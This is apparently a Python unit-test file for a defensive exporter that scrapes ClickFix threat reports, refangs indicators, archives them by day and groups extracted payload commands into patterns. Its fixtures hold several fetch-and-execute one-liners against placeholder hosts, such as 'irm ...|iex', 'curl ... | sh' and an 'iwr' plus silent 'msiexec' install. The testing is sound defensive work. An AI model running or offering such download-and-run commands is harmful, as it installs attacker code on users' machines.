import json
import tempfile
import unittest
import urllib.error
from datetime import datetime, timedelta, timezone
from http.client import IncompleteRead
from pathlib import Path
from unittest.mock import patch

import export_clickfix as exporter


def report(lure="lure[.]example", delivery=(), payload=(), related=(), extracted=""):
    def column(label, values):
        nodes = "".join(
            f'<div class="obs-infra-node"><p class="obs-data">{value}</p></div>'
            for value in values
        )
        return (
            '<div class="obs-infra-column">'
            f'<p class="obs-label">{label}</p>{nodes}</div>'
        )

    related_nodes = "".join(
        f'<li class="obs-infra-related"><span class="obs-data">{value}</span>'
        f'<span class="obs-badge">{tag}</span></li>'
        for value, tag in related
    )
    return (
        extracted
        +
        '<details id="infrastructure"><div class="obs-infra">'
        + column("Lure", [lure])
        + column("Delivery", delivery)
        + column("Payload", payload)
        + f'</div><ul>{related_nodes}</ul><div class="obs-data">unrelated.example</div></details>'
    )


def sitemap(entries):
    urls = "".join(
        f"<url><loc>clickfix-portal.vercel.app/report/{name}</loc>"
        f"<lastmod>{date}</lastmod></url>"
        for name, date in entries
    )
    return f'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">{urls}</urlset>'.encode()


class InfrastructureTests(unittest.TestCase):
    def test_extracts_only_columns_and_refangs_values(self):
        html = report(
            delivery=["delivery[.]example", "192[.]0[.]2[.]4", "2001:db8::1"],
            payload=["https://payload[.]example/a?x=1&amp;y=2"],
        )
        self.assertEqual(
            exporter.parse_infrastructure(html),
            {
                "UrlDomain": "lure.example",
                "DeliveryUrl": ["delivery.example"],
                "PayloadUrl": ["https://payload.example/a?x=1&y=2"],
                "IP": ["192.0.2.4", "2001:db8::1"],
                "Related": [],
                "Payload": None,
                "ResolvedDownloadUrl": [],
            },
        )

    def test_extracts_payload_command_resolved_urls_and_related(self):
        extracted = (
            '<section class="obs-alert obs-alert-danger">'
            '<h2>Extracted payload</h2>'
            '<pre class="obs-data">$f=$([guid]::NewGuid()); '
            'iwr "https://payload[.]example/x?a=1&amp;b=2"</pre>'
            '<div><p class="obs-label">Resolved download <!-- -->URL</p>'
            '<ul><li>https://payload[.]example/x?a=1&amp;b=2</li>'
            '<li>https://other[.]example/file</li></ul></div></section>'
        )
        html = report(
            delivery=["delivery[.]example", "192[.]0[.]2[.]4"],
            payload=["https://payload[.]example/x"],
            related=[("related[.]example", "Reference"),
                     ("192[.]0[.]2[.]4", "resolved-host")],
            extracted=extracted,
        )
        result = exporter.parse_infrastructure(html)
        self.assertEqual(result["IP"], ["192.0.2.4"])
        self.assertEqual(result["PayloadUrl"], ["https://payload.example/x"])
        self.assertEqual(result["Related"], [
            {"Value": "related.example", "Type": "Reference"},
            {"IP": "192.0.2.4", "Type": "resolved-host"},
        ])
        self.assertEqual(
            result["Payload"],
            '$f=$([guid]::NewGuid()); iwr "https://payload[.]example/x?a=1&b=2"',
        )
        self.assertEqual(result["ResolvedDownloadUrl"], [
            "https://payload.example/x?a=1&b=2", "https://other.example/file",
        ])

    def test_lure_and_payload_ip_are_collected_separately(self):
        result = exporter.parse_infrastructure(
            report(lure="192[.]0[.]2[.]1", payload=["2001:db8::1"])
        )
        self.assertIsNone(result["UrlDomain"])
        self.assertEqual(result["PayloadUrl"], [])
        self.assertEqual(result["IP"], ["192.0.2.1", "2001:db8::1"])

    def test_incomplete_payload_or_related_fails(self):
        cases = [
            report(extracted='<section class="obs-alert-danger"><h2>Extracted payload</h2></section>'),
            report().replace('</details>', '<li class="obs-infra-related">bad</li></details>'),
        ]
        for html in cases:
            with self.subTest(html=html), self.assertRaises(ValueError):
                exporter.parse_infrastructure(html)

    def test_empty_columns_are_arrays(self):
        self.assertEqual(exporter.parse_infrastructure(report())["PayloadUrl"], [])
        self.assertEqual(exporter.parse_infrastructure(report())["DeliveryUrl"], [])

    def test_missing_or_changed_structure_fails(self):
        for html in ("<html></html>", report().replace("Payload", "Other"), report()[:-10]):
            with self.subTest(html=html), self.assertRaises(ValueError):
                exporter.parse_infrastructure(html)


class SitemapTests(unittest.TestCase):
    def test_parse_sitemap_uses_utc(self):
        entries = [("one", "2026-11-13T01:00:00+02:00")]
        self.assertEqual(
            exporter.parse_sitemap(sitemap(entries))[0][1].date().isoformat(),
            "2026-11-12",
        )

    def test_rejects_bad_order_and_duplicates(self):
        for entries in (
            [("a", "2026-11-12T00:00:00Z"), ("b", "2026-11-13T00:00:00Z")],
            [("a", "2026-11-13T00:00:00Z"), ("a", "2026-11-12T00:00:00Z")],
        ):
            with self.subTest(entries=entries), self.assertRaises(ValueError):
                exporter.parse_sitemap(sitemap(entries))


class FetchReportTests(unittest.TestCase):
    def test_missing_section_retries_then_succeeds(self):
        with patch.object(
            exporter, "fetch", side_effect=[b"<html>temporary response</html>", report().encode()]
        ) as fetch, patch.object(exporter.time, "sleep") as sleep:
            result = exporter.fetch_report(exporter.BASE_URL + "/report/test")
        self.assertEqual(result["UrlDomain"], "lure.example")
        self.assertEqual(fetch.call_count, 2)
        sleep.assert_called_once_with(5)

    def test_persistent_missing_section_fails_after_three_attempts(self):
        with patch.object(exporter, "fetch", return_value=b"<html>missing</html>") as fetch:
            with patch.object(exporter.time, "sleep") as sleep:
                with self.assertRaisesRegex(RuntimeError, "after 3 attempts.*section found: False"):
                    exporter.fetch_report(exporter.BASE_URL + "/report/test")
        self.assertEqual(fetch.call_count, 3)
        self.assertEqual([call.args[0] for call in sleep.call_args_list], [5, 10])

    def test_transient_network_errors_retry(self):
        url = exporter.BASE_URL + "/report/test"
        errors = [
            urllib.error.URLError("temporary connection failure"),
            TimeoutError("timed out"),
            IncompleteRead(b"partial", 100),
            urllib.error.HTTPError(url, 503, "Unavailable", {}, None),
            urllib.error.HTTPError(url, 429, "Rate limited", {"Retry-After": "30"}, None),
        ]
        for error in errors:
            with self.subTest(error=error):
                with patch.object(exporter, "fetch", side_effect=[error, report().encode()]):
                    with patch.object(exporter.time, "sleep") as sleep:
                        self.assertEqual(exporter.fetch_report(url)["UrlDomain"], "lure.example")
                sleep.assert_called_once_with(30 if getattr(error, "code", None) == 429 else 5)

    def test_permanent_http_and_schema_errors_are_not_retried(self):
        url = exporter.BASE_URL + "/report/test"
        for failure in (
            urllib.error.HTTPError(url, 404, "Not found", {}, None),
            report().replace("Payload", "Unexpected").encode(),
        ):
            with self.subTest(failure=failure):
                with patch.object(exporter, "fetch", side_effect=[failure]) as fetch:
                    with patch.object(exporter.time, "sleep") as sleep:
                        with self.assertRaisesRegex(RuntimeError, "/report/test"):
                            exporter.fetch_report(url)
                fetch.assert_called_once_with(url)
                sleep.assert_not_called()

    def test_retry_after_date_and_invalid_header(self):
        url = exporter.BASE_URL + "/report/test"
        error = urllib.error.HTTPError(
            url, 429, "Rate limited", {"Retry-After": "Fri, 13 Nov 2026 10:00:30 GMT"}, None
        )
        with patch.object(exporter, "datetime") as clock:
            clock.now.return_value = datetime(2026, 11, 13, 10, tzinfo=timezone.utc)
            self.assertEqual(exporter.retry_delay(error, 1), 30)
        error.headers["Retry-After"] = "invalid"
        self.assertEqual(exporter.retry_delay(error, 2), 10)


class RollingSetTests(unittest.TestCase):
    def test_all_windows_exact_boundaries_and_midday_cutoffs(self):
        now = datetime(2026, 11, 13, 14, 30, tzinfo=timezone.utc)
        replacements = {}

        def add(report_id, timestamp):
            entry = {
                "ReportId": report_id, "ScannedAt": timestamp.isoformat(),
                "UrlDomain": "example.com", "DeliveryUrl": [], "PayloadUrl": [],
                "IP": ["192.0.2.1"], "Payload": "unchanged",
            }
            replacements.setdefault(timestamp.date(), []).append(entry)

        for days in exporter.SET_DAYS:
            cutoff = now - timedelta(days=days)
            add(f"exact{days}", cutoff)
            add(f"before{days}", cutoff - timedelta(microseconds=1))
            add(f"after{days}", cutoff + timedelta(microseconds=1))
        add("now", now)
        add("future", now + timedelta(microseconds=1))
        with tempfile.TemporaryDirectory() as directory:
            with patch.object(exporter, "print"):
                sets = exporter.build_sets(Path(directory), now, replacements)
                exporter.write_sets(Path(directory), sets)
            self.assertEqual(set(sets), {*range(1, 11), 14, 30})
            self.assertEqual(
                {p.name for p in (Path(directory) / "sets").glob("*.json")},
                {f"{days}D.json" for days in exporter.SET_DAYS},
            )
            for days, entries in sets.items():
                ids = {entry["ReportId"] for entry in entries}
                self.assertIn(f"exact{days}", ids)
                self.assertIn(f"after{days}", ids)
                self.assertNotIn(f"before{days}", ids)
                self.assertIn("now", ids)
                self.assertNotIn("future", ids)
                self.assertTrue(all(entry["Payload"] == "unchanged" for entry in entries))
                for entry in entries:
                    stamp = datetime.fromisoformat(entry["ScannedAt"])
                    self.assertTrue(now - timedelta(hours=days * 24) <= stamp <= now)

    def test_archived_history_outside_sitemap_and_legacy_exclusion(self):
        now = datetime(2026, 11, 13, 14, tzinfo=timezone.utc)
        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory)
            entry = {
                "ReportId": "historical", "ScannedAt": "2026-10-20T12:00:00Z",
                "UrlDomain": "archive.example", "DeliveryUrl": [], "PayloadUrl": [],
            }
            legacy = {"UrlDomain": "old.example", "DeliveryUrl": [], "PayloadUrl": []}
            path = output / "20261020.json"
            path.write_text(json.dumps([entry, legacy]), encoding="utf-8")
            before = path.read_bytes()
            with patch.object(exporter, "print") as log:
                sets = exporter.build_sets(output, now, {})
            self.assertEqual(sets[30], [entry])
            self.assertEqual(sets[14], [])
            self.assertTrue(any("without ScannedAt" in call.args[0]
                                for call in log.call_args_list))
            self.assertEqual(path.read_bytes(), before)

    def test_invalid_timestamp_fails_before_sets_are_written(self):
        for stamp in (None, "invalid", "2026-11-13T00:00:00", "2026-11-12T00:00:00Z"):
            with self.subTest(stamp=stamp), tempfile.TemporaryDirectory() as directory:
                output = Path(directory)
                entries = [{"ReportId": "bad", "ScannedAt": stamp}]
                with patch.object(exporter, "print"), self.assertRaises(ValueError):
                    exporter.build_sets(
                        output, datetime(2026, 11, 13, 14, tzinfo=timezone.utc),
                        {datetime(2026, 11, 13).date(): entries},
                    )
                self.assertFalse((output / "sets").exists())

    def test_timezone_conversion_and_conflicting_report_ids(self):
        now = datetime(2026, 11, 13, 14, tzinfo=timezone.utc)
        day = now.date()
        records = [
            {"ReportId": "a", "ScannedAt": "2026-11-13T15:00:00+02:00"},
            {"ReportId": "b", "ScannedAt": "2026-11-13T12:30:00Z"},
        ]
        with tempfile.TemporaryDirectory() as directory, patch.object(exporter, "print"):
            sets = exporter.build_sets(Path(directory), now, {day: records})
            self.assertEqual([row["ReportId"] for row in sets[1]], ["a", "b"])
            duplicate = {"ReportId": "a", "ScannedAt": "2026-11-13T12:00:00Z"}
            with self.assertRaisesRegex(ValueError, "Conflicting archived ReportId"):
                exporter.build_sets(Path(directory), now, {day: [*records, duplicate]})

    def test_sets_roll_forward_even_without_new_reports(self):
        now = datetime(2026, 11, 13, 14, tzinfo=timezone.utc)
        replacements = {
            now.date(): [{"ReportId": "one", "ScannedAt": now.isoformat()}],
        }
        with tempfile.TemporaryDirectory() as directory, patch.object(exporter, "print"):
            output = Path(directory)
            exporter.write_sets(output, exporter.build_sets(output, now, replacements))
            path = output / "sets" / "1D.json"
            self.assertEqual(len(json.loads(path.read_text())), 1)
            modified = path.stat().st_mtime_ns
            exporter.write_sets(output, exporter.build_sets(output, now, replacements))
            self.assertEqual(path.stat().st_mtime_ns, modified)
            exporter.write_sets(
                output, exporter.build_sets(output, now + timedelta(days=1, seconds=1), replacements)
            )
            self.assertEqual(json.loads(path.read_text()), [])


class ExportTests(unittest.TestCase):
    def test_archive_preserves_partial_day_and_existing_older_files(self):
        entries = [
            ("today", "2026-11-13T10:00:00Z"),
            ("yesterday", "2026-11-12T10:00:00Z"),
            ("partial", "2026-11-10T10:00:00Z"),
        ]
        page = report(
            delivery=["delivery[.]example", "192[.]0[.]2[.]4"],
            payload=["https://payload[.]example/x"],
            related=[("related[.]example", "Reference")],
            extracted=(
                '<section class="obs-alert-danger"><h2>Extracted payload</h2>'
                '<pre>iwr https://payload[.]example/x</pre>'
                '<div><p class="obs-label">Resolved download URL</p>'
                '<ul><li>https://payload[.]example/x</li></ul></div></section>'
            ),
        ).encode()

        def fake_fetch(url):
            return sitemap(entries) if url == exporter.SITEMAP_URL else page

        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory)
            partial = [{"UrlDomain": "other.example", "DeliveryUrl": [], "PayloadUrl": []}]
            (output / "20261110.json").write_text(json.dumps(partial), encoding="utf-8")
            older = '[{"UrlDomain":"older.example","DeliveryUrl":[],"PayloadUrl":[]}]'
            (output / "20261109.json").write_text(older, encoding="utf-8")
            with patch.object(exporter, "fetch", side_effect=fake_fetch):
                exporter.export(output, datetime(2026, 11, 13, 23, tzinfo=timezone.utc), 0)
            partial_result = json.loads((output / "20261110.json").read_text())
            self.assertEqual(partial_result[0], partial[0])
            self.assertEqual(partial_result[1]["ReportId"], "partial")
            self.assertEqual((output / "20261109.json").read_text(), older)
            self.assertFalse((output / "20261108.json").exists())
            self.assertEqual(json.loads((output / "20261111.json").read_text()), [])
            result = json.loads((output / "20261113.json").read_text())
            self.assertEqual(result[0]["ScannedAt"], "2026-11-13T10:00:00+00:00")
            self.assertEqual(
                json.loads((output / "sets" / "1D.json").read_text()), result
            )
            self.assertEqual(result[0]["DeliveryUrl"], ["delivery.example"])
            self.assertEqual(result[0]["IP"], ["192.0.2.4"])
            self.assertEqual(result[0]["PayloadUrl"], ["https://payload.example/x"])
            self.assertEqual(result[0]["Payload"], "iwr https://payload[.]example/x")
            self.assertEqual(result[0]["ResolvedDownloadUrl"], ["https://payload.example/x"])
            self.assertEqual(result[0]["Related"], [{"Value": "related.example", "Type": "Reference"}])

    def test_partial_day_created_when_missing(self):
        entries = [("partial", "2026-11-10T10:00:00Z")]
        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory)
            with patch.object(
                exporter, "fetch", side_effect=[sitemap(entries), report().encode()]
            ):
                exporter.export(output, datetime(2026, 11, 13, 23, tzinfo=timezone.utc), 0)
            self.assertEqual(len(json.loads((output / "20261110.json").read_text())), 1)

    def test_failed_report_does_not_change_existing_output(self):
        entries = [("report", "2026-11-13T10:00:00Z"), ("old", "2026-11-12T10:00:00Z")]
        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory)
            existing = output / "20261113.json"
            existing.write_text("[]", encoding="utf-8")
            def fake_fetch(url):
                return sitemap(entries) if url == exporter.SITEMAP_URL else b"<html>missing</html>"

            with patch.object(exporter, "fetch", side_effect=fake_fetch):
                with patch.object(exporter.time, "sleep"):
                    with self.assertRaisesRegex(RuntimeError, "/report/report.*after 3 attempts"):
                        exporter.export(output, datetime(2026, 11, 13, 23, tzinfo=timezone.utc), 0)
            self.assertEqual(existing.read_text(), "[]")

    def test_append_by_report_id_and_preserve_legacy_records_across_days(self):
        entries = [
            ("new", "2026-11-13T12:00:00Z"),
            ("known", "2026-11-13T11:00:00Z"),
            ("legacy", "2026-11-13T10:00:00Z"),
            ("oldnew", "2026-11-12T10:00:00Z"),
        ]
        existing = {
            "ReportId": "known", "UrlDomain": "known.example",
            "DeliveryUrl": [], "PayloadUrl": [],
        }
        legacy = {"UrlDomain": "same.example", "DeliveryUrl": [], "PayloadUrl": []}
        old = {"UrlDomain": "old.example", "DeliveryUrl": [], "PayloadUrl": []}
        calls = []

        def fake_fetch(url):
            calls.append(url)
            if url == exporter.SITEMAP_URL:
                return sitemap(entries)
            return report(lure="same[.]example").encode()

        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory)
            current = output / "20261113.json"
            previous = output / "20261112.json"
            current.write_text(json.dumps([existing, legacy]), encoding="utf-8")
            previous.write_text(json.dumps([old]), encoding="utf-8")
            with patch.object(exporter, "fetch", side_effect=fake_fetch):
                exporter.export(output, datetime(2026, 11, 13, 23, tzinfo=timezone.utc), 0)
                result = json.loads(current.read_text())
                self.assertEqual(
                    [{k: v for k, v in row.items() if k != "ScannedAt" and
                      (k != "ReportId" or index == 0)}
                     for index, row in enumerate(result[:2])],
                    [existing, legacy],
                )
                self.assertEqual(result[1]["ReportId"], "new")
                self.assertEqual(len(result), 3)
                self.assertEqual(result[2]["ReportId"], "legacy")
                self.assertEqual(json.loads(previous.read_text())[0], old)
                self.assertEqual(json.loads(previous.read_text())[1]["ReportId"], "oldnew")
                before = current.read_bytes()
                old_before = previous.read_bytes()
                exporter.export(output, datetime(2026, 11, 13, 23, tzinfo=timezone.utc), 0)
                self.assertEqual(current.read_bytes(), before)
                self.assertEqual(previous.read_bytes(), old_before)
            self.assertNotIn(exporter.BASE_URL + "/report/known", calls)

    def test_distinct_reports_with_identical_data_remain_distinct(self):
        entries = [("a", "2026-11-13T12:00:00Z"), ("b", "2026-11-13T11:00:00Z")]

        def fake_fetch(url):
            return sitemap(entries) if url == exporter.SITEMAP_URL else report().encode()

        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory)
            with patch.object(exporter, "fetch", side_effect=fake_fetch):
                exporter.export(output, datetime(2026, 11, 13, 23, tzinfo=timezone.utc), 0)
                exporter.export(output, datetime(2026, 11, 13, 23, tzinfo=timezone.utc), 0)
            result = json.loads((output / "20261113.json").read_text())
            self.assertEqual([entry["ReportId"] for entry in result], ["a", "b"])

    def test_invalid_existing_data_fails_without_writing(self):
        entries = [("a", "2026-11-13T12:00:00Z")]
        for content in ('not json', '{}', '[{"ReportId": "a"}, {"ReportId": "a"}]'):
            with self.subTest(content=content), tempfile.TemporaryDirectory() as directory:
                output = Path(directory)
                file = output / "20261113.json"
                file.write_text(content, encoding="utf-8")
                with patch.object(exporter, "fetch", return_value=sitemap(entries)):
                    with self.assertRaises(ValueError):
                        exporter.export(output, datetime(2026, 11, 13, 23, tzinfo=timezone.utc), 0)
                self.assertEqual(file.read_text(), content)


class PatternTests(unittest.TestCase):
    def entry(self, report_id, payload, stamp="2026-11-13T10:00:00Z"):
        return {"ReportId": report_id, "ScannedAt": stamp, "Payload": payload}

    def test_normalizes_urls_without_rewriting_other_command_values(self):
        self.assertEqual(
            exporter.normalize_payload(
                '  $f="$env:TEMP\\file.msi";iwr "http://host[.]example/x";'
                'cmd /c msiexec /i $f /qn;  '
            ),
            '$f="$env:TEMP\\file.msi";iwr "<URL>";cmd /c msiexec /i $f /qn;',
        )
        self.assertEqual(
            exporter.normalize_payload("irm 'host.example/x'|iex"),
            "irm '<URL>'|iex",
        )
        self.assertEqual(
            exporter.normalize_payload('curl https://host.example/a?x=1&y=2 | sh'),
            'curl <URL> | sh',
        )
        self.assertEqual(
            exporter.normalize_payload('echo file.msi\r\nWrite-Output "A  B"'),
            'echo file.msi\nWrite-Output "A  B"',
        )

    def test_includes_all_families_singletons_and_long_payloads(self):
        entries = [
            self.entry("a", "irm 'https://a.example/x'|iex"),
            self.entry("b", "irm 'https://b.example/x'|iex",
                       "2026-11-12T10:00:00+00:00"),
            self.entry("c", "curl https://c.example/x | sh"),
            self.entry("d", "$encoded='" + "A" * 3000 + "'"),
            self.entry("e", None),
            self.entry("f", " \n "),
        ]
        patterns = exporter.build_patterns(entries + [entries[0]])
        self.assertEqual(len(patterns), 3)
        self.assertEqual(patterns[0]["Pattern"], "irm '<URL>'|iex")
        self.assertEqual(patterns[0]["DistinctPayloadCount"], 2)
        self.assertEqual(patterns[0]["ReportCount"], 2)
        self.assertEqual(patterns[0]["ReportIds"], ["a", "b"])
        self.assertEqual(patterns[0]["FirstSeen"], "2026-11-12T10:00:00+00:00")
        self.assertEqual(patterns[0]["LastSeen"], "2026-11-13T10:00:00+00:00")
        self.assertEqual(
            exporter.build_patterns(list(reversed(entries))), patterns
        )

    def test_identical_payloads_have_separate_report_and_variant_counts(self):
        patterns = exporter.build_patterns([
            self.entry("a", "echo hello"), self.entry("b", "echo hello"),
        ])
        self.assertEqual(patterns[0]["DistinctPayloadCount"], 1)
        self.assertEqual(patterns[0]["ReportCount"], 2)

    def test_invalid_reports_fail_explicitly(self):
        invalid = [
            {}, self.entry("a", 42), self.entry("a", "echo", "bad date"),
            self.entry("a", "echo", "2026-11-13T10:00:00"),
        ]
        for entry in invalid:
            with self.subTest(entry=entry), self.assertRaises(ValueError):
                exporter.build_patterns([entry])
        with self.assertRaisesRegex(ValueError, "Conflicting"):
            exporter.build_patterns([
                self.entry("a", "echo one"), self.entry("a", "echo two"),
            ])

    def test_text_lines_round_trip_and_unchanged_files_are_not_rewritten(self):
        patterns = exporter.build_patterns([
            self.entry("a", 'echo "A  B"\necho C:\\temp\\file'),
        ])
        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory)
            exporter.write_patterns(output, patterns)
            text = (output / "Patterns.txt").read_text(encoding="utf-8")
            self.assertEqual(len(text.splitlines()), 1)
            self.assertEqual(json.loads('"' + text.strip() + '"'), patterns[0]["Pattern"])
            self.assertEqual(
                json.loads((output / "Patterns.json").read_text(encoding="utf-8")),
                patterns,
            )
            with patch.object(Path, "write_text") as write:
                exporter.write_patterns(output, patterns)
                write.assert_not_called()
            exporter.write_patterns(output, [])
            self.assertEqual((output / "Patterns.txt").read_text(), "")
            self.assertEqual(json.loads((output / "Patterns.json").read_text()), [])

    def test_export_generates_patterns_from_same_seven_day_set(self):
        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory)
            page = report(extracted=(
                '<section class="obs-alert obs-alert-danger">'
                '<h2>Extracted payload</h2>'
                '<pre class="obs-data">irm https://host.example/x|iex</pre>'
                '</section>'
            ))
            with patch.object(exporter, "fetch", side_effect=[
                sitemap([("a", "2026-11-13T10:00:00Z")]), page.encode(),
            ]):
                exporter.export(output, datetime(2026, 11, 13, 12, tzinfo=timezone.utc), 0)
            entries = json.loads((output / "sets" / "7D.json").read_text())
            self.assertEqual(
                json.loads((output / "Patterns.json").read_text()),
                exporter.build_patterns(entries),
            )


if __name__ == "__main__":
    unittest.main()
